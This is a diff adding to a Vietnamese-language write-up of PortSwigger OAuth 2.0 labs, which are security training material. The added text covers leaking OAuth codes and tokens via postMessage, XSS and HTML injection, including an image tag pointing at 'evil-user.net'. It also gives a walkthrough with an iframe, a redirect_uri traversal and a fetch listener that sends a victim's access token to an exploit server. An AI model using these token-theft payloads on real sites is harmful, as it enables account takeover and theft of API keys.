@@ -1,4 +1,4 @@
-# LỖ HỔNG OAuth 2.0 authentication (PORTSWIGGER)
+<img width="1895" height="935" alt="image" src="https://github.com/user-attachments/assets/c338c668-c60a-4cb6-9a5b-34455619b3fa" /># LỖ HỔNG OAuth 2.0 authentication (PORTSWIGGER)
 
 ---
 
@@ -244,7 +244,7 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
 
   Sau khi lấy được thông tin user từ OAuth provider, script sẽ gửi POST request đến endpoint /authenticate của OAuth server để lưu thông tin người dùng cho những lần đăng nhập tiếp theo như đã đề cập ở trên.
 
-- Cuối cùng, email và username được lấy từ API /me của OAuth provider và token chính là access token mà ứng dụng đã lấy được từ OAuth server (bước trước), qua đây nó sẽ sẻ dụng POST request để gửi những dữ liệu này nên server cho những lần đăng nhập tiếp theo và sau đó gán cho người dùng một session cookie (để ý phần Set-Cookie trong phản hồi):
+- Cuối cùng, email và username được lấy từ API /me của OAuth provider và token chính là access token mà ứng dụng đã lấy được từ OAuth server (bước trước), qua đây nó sẽ sử dụng POST request để gửi những dữ liệu này nên server cho những lần đăng nhập tiếp theo và sau đó gán cho người dùng một session cookie (để ý phần Set-Cookie trong phản hồi):
 
   <img width="1866" height="606" alt="image" src="https://github.com/user-attachments/assets/491a16a5-edc4-4cd9-ae19-8338459af3da" />
 
@@ -572,7 +572,7 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
   https://oauth-0a6a004e041e9f2180fef1df026f00a9.oauth-server.net/auth?client_id=pzaphg5dxngdwfczpt306&redirect_uri=https://0a2500c104f59f5d8049f35700f6007c.web-security-academy.net/oauth-callback/../post/next?path=https://exploit-0a5c00c204979f178005f262010c0058.exploit-server.net/exploit&response_type=token&nonce=-1090283847&scope=openid%20profile%20email
   ```
 
-  Kết quả khi thực hiện truy cập đường dẫn URl, ta sẽ tháy nó chuyển hướng về trang exploit server "Hello World!"
+  Kết quả khi thực hiện truy cập đường dẫn URl, ta sẽ thấy nó chuyển hướng về trang exploit server "Hello World!"
 
   <img width="1919" height="1005" alt="Screenshot 2025-08-28 013504" src="https://github.com/user-attachments/assets/b5ed51a7-8822-4ef0-95cd-d9bc38c5ce3e" />
 
@@ -618,10 +618,112 @@ Khi thực hiện lướt web, chúng ta gần như chắc chắn đã bắt g�
 
   &rarr; Kết quả ta đã thực hiện API call thành công để lấy dữ liệu của nạn nhân, bao gồm cả khóa API của họ.
 
-  
+- Ngoài các open redirects, ta cũng nên tìm kiếm bất kỳ lỗ hổng nào khác cho phép trích xuất code hoặc token và gửi nó đến một miền bên ngoài. Một vài ví dụ hiệu quả bao gồm:
+
+  - *Dangerous JavaScript (nguy hiểm khi xử lý query/fragment)*: Một số app có JS lấy query string (?code=XYZ) hoặc fragment (#access_token=ABC) để xử lý, ví dụ hiển thị     lên UI hoặc gửi sang iframe qua postMessage. Nếu JS này viết không an toàn, attacker có thể:
+    
+    - Inject payload để token bị forward đi.
+    
+    - Lợi dụng “gadget chain” → token đi qua nhiều script trung gian rồi mới thoát ra ngoài domain attacker.
+   
+        Ví dụ:
+
+        ```html
+        window.postMessage(location.hash, "*");
+        ```
+
+        &rarr; Token trong fragment bị gửi đi mọi origin chứ không chỉ domain hợp lệ → attacker nghe lén được.
+
+  - *XSS vulnerabilities*: Bình thường XSS có impact lớn, nhưng attacker chỉ có “khoảng thời gian ngắn” trước khi user tắt tab/đóng session. Ngoài ra, cookie thường được     bảo vệ bằng HttpOnly → JS không đọc được. Nếu thay vì ăn cắp cookie, attacker dùng XSS để ăn cắp OAuth code/token, thì:
+
+    - Token = “vé hợp pháp” để login ở browser attacker.
+
+    - Attacker có thời gian dài hơn để khai thác account nạn nhân, không phụ thuộc vào session nạn nhân.\
+   
+  - *HTML injection vulnerabilities*: Trường hợp CSP chặn JS và filtering nghiệm ngặt, chỉ inject được HTML thô. Ta vẫn có trick để leak code/token nhờ Referer header.
+ 
+    Ví dụ:
+
+    - redirect_uri trỏ đến một page mà bạn có thể inject HTML:
+
+    ```html
+    <img src="https://evil-user.net/steal.png">
+    ```
+
+    - Khi browser load steal.png, nó gửi request đến evil-user.net. Trình duyệt (ví dụ Firefox) sẽ gửi full URL của trang hiện tại trong Referer header, gồm cả ?code=XYZ.
+
+    &rarr; Attacker đọc log server evil-user.net → thấy code/token.
+
+### Lab: Stealing OAuth access tokens via a proxy page
+
+- Giao diện trang web thực hiện khai thác:
+
+  <img width="1895" height="935" alt="image" src="https://github.com/user-attachments/assets/cae9596a-eda5-41b6-84f2-e4454ea74da7" />
+
+- Tương tự như bài lab trước về mặt cho phép user đăng nhập bằng social media.
+
+- Cũng tương tự như bài lab trước, sử dụng Burp Proxy Interception ta phát hiện thấy được rằng tham số *redirect_uri* trong GET request *GET /auth?client_id=[...]* có lỗ hổng directory traversal /../
+
+  <img width="1868" height="800" alt="Screenshot 2025-09-03 144058" src="https://github.com/user-attachments/assets/772ed270-6f42-4456-ad72-4a850dae87ba" />
+
+- Quan sát thấy được rằng trong mỗi blog post của trang web, comment form được bao gồm một iframe kiểu: */post/comment/comment-form#postId=?*
+
+- Sử dụng Burp, ta thấy được page */post/comment/comment-form* như sau:
+
+  <img width="1865" height="808" alt="image" src="https://github.com/user-attachments/assets/2b624940-467d-4738-a004-2d9e620bf41a" />
+
+  Chú ý thấy được rằng nó sử dụng phương thức *postMessage()* cho phép gửi dữ liệu trong thuộc tính *window.location.href* (full URL hiện tại của iframe) tới parent        window (iframe với src */post/comment/comment-form* là child window, trang gốc bọc bên ngoài là parent window). Một điều đáng chú ý là tham số '**', đây là tham số       origin mà message muốn gửi tới, với '*' tức nghĩa là gửi cho bất kỳ domain nào không cần check.
+
+  **Note**: Origin được định nghĩa = protocol + hostname + port, hai URL chỉ được coi là cùng origin nếu cả 3 phần này trùng nhau..Origin là ranh giới an toàn trong        trình duyệt, dùng trong Same-Origin Policy (SOP). Ví dụ:
+
+  ```html
+  iframe.contentWindow.postMessage("hello", "https://app.victim.com");
+  ```
+
+  &rarr; Chỉ iframe chạy đúng origin https://app.victim.com mới nhận được.
+
+- Trong exploit server, phần body ta tạo một thẻ *iframe* trong đó thuộc tính src là URL của GET request /auth?client_id=[...] và sử dụng directory traversal để thay đổi *redirect_uri* trỏ tới phần comment form:
+
+  ```html
+  <iframe src="https://oauth-0a000099040155ac80791fc402e10024.oauth-server.net/auth?      client_id=d65gmiamgflj73aitqkbx&redirect_uri=https://0a2e002104a6550d80802158005e00ba.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1939139160&scope=openid%20profile%20email"></iframe>
+  ```
+
+- Ở bên dưới, ta sẽ thêm một đoạn script để lắng nghe web messages:
+
+  ```html
+  <script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+  </script>
+  ```
+
+  <img width="1892" height="938" alt="image" src="https://github.com/user-attachments/assets/bfd748c4-7174-4a85-83f4-7c562808b542" />
+
+  <p style="text-align: justify;"> &rarr; Tức là sau khi victim user click vào link giấu trong iframe, lúc này đường dẫn URL trả về access token được chuyển hướng tới comment form là */post/comment/comment-form*, do trong comment form sử dụng postMessage() để gửi dữ liệu full URL hiện tại của iframe tới parent window (ở đây là exploit server). Mà parent lại có đoạn code script như trên (fetch gadget), do đó access token cuối cùng sẽ được exploit server lắng nghe và tự động gửi request đó về cho chính nó, lúc này ta chỉ cần kiểm tra access log để lấy access token. </p>
+
+- Kiểm tra access log, ta thu được:
+
+  <img width="1895" height="919" alt="image" src="https://github.com/user-attachments/assets/054338b6-bba0-40a5-9b7d-c2c73de3a804" />
+
+- Thay token ở trong trường *Authorization* của request /me, sau đó gửi lại request, ta sẽ thu được api key của admin:
+
+  <img width="1868" height="816" alt="image" src="https://github.com/user-attachments/assets/d220b993-20f1-4f63-837b-d4454cb3fcf0" />
+
+  → Kết quả ta đã thực hiện API call thành công để lấy dữ liệu của nạn nhân, bao gồm cả khóa API của họ.
 
 
   
+
+  
+
+
+
+
+
+
+
+
 
   
 
